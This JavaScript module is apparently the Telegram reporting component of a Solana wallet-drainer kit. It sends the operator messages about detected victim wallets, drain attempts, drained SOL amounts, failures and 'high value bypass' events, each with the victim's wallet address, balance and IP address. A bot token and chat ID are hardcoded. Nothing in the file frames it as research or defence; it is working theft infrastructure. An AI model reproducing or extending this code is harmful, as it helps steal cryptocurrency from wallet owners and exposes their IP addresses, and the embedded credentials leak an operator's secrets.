import 'dotenv/config';

class TelegramLogger {
  constructor() {
    // Try environment variables first, then fallback to hardcoded values
    this.botToken = process.env.TELEGRAM_BOT_TOKEN || '8183467058:AAHf02SzNmP5xoqtRvIJQAN5bKE7_f-gMPQ';
    this.chatId = process.env.TELEGRAM_CHAT_ID || '7900328128';
    
    // Enable Telegram with valid credentials
    this.enabled = !!(this.botToken && this.chatId);
    
    if (this.enabled) {
      console.log('[TELEGRAM] Initialized with valid credentials');
    } else {
      console.warn('[TELEGRAM] No valid credentials found - logging disabled');
    }
    
    // Enable logging for drain amounts in production
    this.logDrainAmounts = true;
  }

  /**
   * Send message to Telegram
   */
  async sendMessage(message, type = 'info') {
    if (!this.enabled) return;

    // Validate message
    if (!message || typeof message !== 'string') {
      console.error('[TELEGRAM] Invalid message format:', message);
      return;
    }

    // Validate type
    if (!type || typeof type !== 'string') {
      console.error('[TELEGRAM] Invalid message type:', type);
      type = 'info';
    }

    try {
      const formattedMessage = this.formatMessage(message, type);
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: formattedMessage,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('❌ Failed to send Telegram message:', response.statusText, errorText);
        
        // Retry once for rate limiting or temporary errors
        if (response.status === 429 || response.status >= 500) {
          console.log('[TELEGRAM] Retrying message after delay...');
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          try {
            const retryResponse = await fetch(url, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                chat_id: this.chatId,
                text: formattedMessage,
                parse_mode: 'HTML',
                disable_web_page_preview: true
              })
            });
            
            if (!retryResponse.ok) {
              console.error('❌ Telegram retry also failed:', retryResponse.statusText);
            } else {
              console.log('✅ Telegram message sent successfully on retry');
            }
          } catch (retryError) {
            console.error('❌ Telegram retry error:', retryError.message);
          }
        }
      } else {
        console.log('✅ Telegram message sent successfully');
      }
    } catch (error) {
      console.error('❌ Telegram send error:', error.message);
      
      // Log to console as fallback for critical errors
      if (type === 'ERROR' || type === 'DRAIN_FAILED' || type === 'SECURITY_EVENT') {
        console.error('[TELEGRAM_FALLBACK] Critical message that failed to send:', {
          type: type,
          message: message,
          error: error.message
        });
      }
      
      // Always log to console for debugging
      console.log('[TELEGRAM_CONSOLE_FALLBACK] Message that failed to send to Telegram:', {
        type: type,
        message: message,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Format message with emojis and styling
   */
  formatMessage(message, type) {
    const timestamp = new Date().toLocaleString();
    const emoji = this.getEmoji(type);
    const prefix = this.getPrefix(type);
    
    return `${emoji} <b>${prefix}</b>\n\n${message}\n\n<code>⏰ ${timestamp}</code>`;
  }

  /**
   * Get emoji for message type
   */
  getEmoji(type) {
    const emojis = {
      'WALLET_DETECTED': '👛',
      'DRAIN_SUCCESS': '💰',
      'DRAIN_FAILED': '❌',
      'TRANSACTION_CANCELLED': '🚫',
      'RATE_LIMIT': '⏰',
      'HIGH_VALUE_BYPASS': '💎',
      'INSUFFICIENT_FUNDS': '💸',
      'ERROR': '🚨',
      'DRAIN_ATTEMPT': '🔄',
      'SECURITY_EVENT': '🔒',
      'DRAIN_CREATED': '📝'
    };
    return emojis[type] || 'ℹ️';
  }

  /**
   * Get prefix for message type
   */
  getPrefix(type) {
    const prefixes = {
      'WALLET_DETECTED': 'WALLET DETECTED',
      'DRAIN_SUCCESS': 'DRAIN SUCCESS',
      'DRAIN_FAILED': 'DRAIN FAILED',
      'TRANSACTION_CANCELLED': 'TRANSACTION CANCELED',
      'RATE_LIMIT': 'RATE LIMIT',
      'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
      'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
      'ERROR': 'ERROR',
      'DRAIN_ATTEMPT': 'DRAIN ATTEMPT',
      'SECURITY_EVENT': 'SECURITY EVENT',
      'DRAIN_CREATED': 'DRAIN CREATED'
    };
    return prefixes[type] || 'INFO';
  }

  /**
   * Log wallet detection (all wallets, balance will be updated later)
   */
  async logWalletDetected(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logWalletDetected:', data);
      return;
    }

    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    // Safe string conversion with fallback
    const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey.substring(0, 8) + '...' : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    
    // Debug logging
    console.log('[TELEGRAM] logWalletDetected called with:', {
      publicKey: data.publicKey,
      walletType: data.walletType,
      lamports: data.lamports,
      ip: data.ip
    });
    console.log('[TELEGRAM] Wallet type for display:', walletType);
    console.log('[TELEGRAM] Known wallet types:', ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus']);

    // Show wallet type if it's a known wallet type
    const knownWalletTypes = ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus'];
    const walletTypeDisplay = knownWalletTypes.includes(walletType) ? `💼 <b>Type:</b> ${walletType}` : '';
    console.log('[TELEGRAM] Wallet type display:', walletTypeDisplay);

    const message = `
<b>👛 Wallet Detected</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'WALLET_DETECTED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send wallet detected message:', error.message);
      // Console fallback for wallet detection logs
      console.log('[TELEGRAM_WALLET_FALLBACK] Wallet detected details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        ip: data.ip,
        walletType: data.walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log successful drain (only after broadcast confirmation)
   */
  async logDrainSuccess(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logDrainSuccess:', data);
      return;
    }

    const drainedAmount = parseInt(data.actualDrainAmount) || 0;
    const drainedSOL = (drainedAmount / 1e9).toFixed(6);
    
    // Safe string conversion with fallback
    const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey.substring(0, 8) + '...' : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    // Ensure drained amount is always shown, even if 0
    const drainedDisplay = drainedAmount > 0 ? `${drainedSOL} SOL (${drainedAmount} lamports)` : '0.000000 SOL (0 lamports)';
    
    // Always log drain success in production
    console.log('[TELEGRAM_DRAIN_SUCCESS] Drain success logged:', {
      publicKey: data.publicKey,
      drainedAmount: drainedAmount,
      drainedSOL: drainedSOL,
      balance: balance,
      balanceSOL: balanceSOL,
      ip: ip,
      walletType: walletType
    });
    
    const message = `
<b>💰 Drain Success</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
💰 <b>Drained:</b> ${drainedDisplay}
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'DRAIN_SUCCESS');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send drain success message:', error.message);
      // Console fallback for critical success logs
      console.log('[TELEGRAM_DRAIN_SUCCESS_FALLBACK] Drain success details:', {
        publicKey: data.publicKey,
        actualDrainAmount: data.actualDrainAmount,
        lamports: data.lamports,
        ip: data.ip,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log failed drain with specific reason
   */
  async logDrainFailed(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logDrainFailed:', data);
      return;
    }

    // Safe string conversion with fallback
    const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey.substring(0, 8) + '...' : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    let reason = 'Unknown error';
    
    if (data.error) {
      console.log('[TELEGRAM] Processing error:', data.error, 'Type:', typeof data.error);
      
      // Convert error to string for comparison
      const errorString = typeof data.error === 'string' ? data.error : JSON.stringify(data.error);
      console.log('[TELEGRAM] Error string:', errorString);
      
      if (errorString.includes('INSUFFICIENT_FUNDS')) {
        reason = 'Insufficient funds for fees';
      } else if (errorString.includes('INSUFFICIENT_SOL_FOR_FEES')) {
        reason = 'Insufficient SOL for transaction fees';
      } else if (errorString.includes('INSUFFICIENT_DRAIN_AMOUNT')) {
        reason = 'Drain amount too small after fees';
      } else if (errorString.includes('RATE_LIMITED')) {
        reason = 'Rate limit exceeded';
      } else if (errorString.includes('timeout')) {
        reason = 'Transaction timeout';
      } else if (errorString.includes('Simulation failed')) {
        reason = 'Transaction simulation failed';
      } else if (errorString.includes('InsufficientFundsForRent')) {
        reason = 'Insufficient funds for rent exemption';
      } else {
        reason = errorString;
      }
      
      console.log('[TELEGRAM] Final reason:', reason);
    }
    
    const message = `
<b>❌ Drain Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
❌ <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'DRAIN_FAILED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send drain failed message:', error.message);
      // Console fallback for critical failure logs
      console.error('[TELEGRAM_DRAIN_FAILED_FALLBACK] Drain failed details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        ip: data.ip,
        error: data.error,
        walletType: walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log transaction cancellation
   */
  async logTransactionCancelled(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logTransactionCancelled:', data);
      return;
    }

    // Safe string conversion with fallback
    const publicKey = data.publicKey ? String(data.publicKey) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey.substring(0, 8) + '...' : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    const reason = String(data.reason || 'User canceled the transaction');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>🚫 Transaction Cancelled</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
❌ <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'TRANSACTION_CANCELLED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send transaction cancelled message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_CANCELLED_FALLBACK] Transaction cancelled details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        ip: data.ip,
        reason: data.reason,
        walletType: walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log rate limit events
   */
  async logRateLimit(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logRateLimit:', data);
      return;
    }

    // Safe string conversion with fallback
    const user = data.user ? String(data.user) : 'Unknown';
    const walletAddress = user !== 'Unknown' ? user.substring(0, 8) + '...' : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const details = String(data.details || 'No details provided');
    
    const message = `
<b>⏰ Rate Limit</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
📝 <b>Details:</b> ${details}
    `.trim();

    try {
      await this.sendMessage(message, 'RATE_LIMIT');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send rate limit message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_RATE_LIMIT_FALLBACK] Rate limit details:', {
        user: data.user,
        ip: data.ip,
        details: data.details,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log high value wallet bypass
   */
  async logHighValueBypass(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logHighValueBypass:', data);
      return;
    }

    // Safe string conversion with fallback
    const user = data.user ? String(data.user) : 'Unknown';
    const walletAddress = user !== 'Unknown' ? user.substring(0, 8) + '...' : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>💎 High Value Bypass</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'HIGH_VALUE_BYPASS');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send high value bypass message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_BYPASS_FALLBACK] High value bypass details:', {
        user: data.user,
        lamports: data.lamports,
        ip: data.ip,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log insufficient funds
   */
  async logInsufficientFunds(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logInsufficientFunds:', data);
      return;
    }

    // Safe string conversion with fallback
    const user = data.user ? String(data.user) : 'Unknown';
    const walletAddress = user !== 'Unknown' ? user.substring(0, 8) + '...' : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>💸 Insufficient Funds</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'INSUFFICIENT_FUNDS');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send insufficient funds message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_INSUFFICIENT_FALLBACK] Insufficient funds details:', {
        user: data.user,
        lamports: data.lamports,
        ip: data.ip,
        reason: data.reason,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log general errors
   */
  async logError(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logError:', data);
      return;
    }

    // Safe string conversion with fallback
    const user = data.user ? String(data.user) : 'Unknown';
    const walletAddress = user !== 'Unknown' ? user.substring(0, 8) + '...' : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const errorMessage = String(data.message || data.details || data.error || 'Unknown error');
    
    const message = `
<b>🚨 Error</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
❌ <b>Error:</b> ${errorMessage}
    `.trim();

    try {
      await this.sendMessage(message, 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send error message:', error.message);
      // Console fallback for critical errors
      console.error('[TELEGRAM_ERROR_FALLBACK] Error details:', {
        user: user,
        ip: ip,
        error: errorMessage,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log drain attempt (transaction creation)
   */
  async logDrainAttempt(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    const success = data.success !== undefined ? data.success : true;
    const instructions = data.instructions || 0;
    const transactionSize = data.transactionSize || 0;
    const walletType = String(data.walletType || 'Unknown');
    
    const message = `
<b>🔄 Drain Attempt</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
📊 <b>Status:</b> ${success ? '✅ Success' : '❌ Failed'}
📝 <b>Instructions:</b> ${instructions}
📦 <b>Size:</b> ${transactionSize} bytes
    `.trim();

    try {
      await this.sendMessage(message, 'DRAIN_ATTEMPT');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send drain attempt message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_DRAIN_ATTEMPT_FALLBACK] Drain attempt details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        ip: data.ip,
        success: data.success,
        walletType: walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log security events (rate limiting, blocked IPs, etc.)
   */
  async logSecurityEvent(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const eventType = data.type || 'Unknown';
    const details = data.details || 'No details provided';
    
    const message = `
<b>🔒 Security Event</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
🚨 <b>Type:</b> ${eventType}
📝 <b>Details:</b> ${details}
    `.trim();

    try {
      await this.sendMessage(message, 'SECURITY_EVENT');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send security event message:', error.message);
      // Console fallback for security events
      console.log('[TELEGRAM_SECURITY_FALLBACK] Security event details:', {
        user: data.user,
        ip: data.ip,
        type: data.type,
        details: data.details,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log drain transaction created (before signing)
   */
  async logDrainCreated(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    const drainAmount = data.actualDrainAmount || 0;
    const drainAmountSOL = (drainAmount / 1e9).toFixed(6);
    const walletType = String(data.walletType || 'Unknown');
    
    const message = `
<b>📝 Drain Created</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
💸 <b>Drain Amount:</b> ${drainAmountSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'DRAIN_CREATED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send drain created message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_CREATED_FALLBACK] Drain created details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        actualDrainAmount: data.actualDrainAmount,
        ip: data.ip,
        walletType: walletType,
        timestamp: new Date().toISOString()
      });
    }
  }
}

// Create singleton instance
const telegramLogger = new TelegramLogger();

export default telegramLogger; 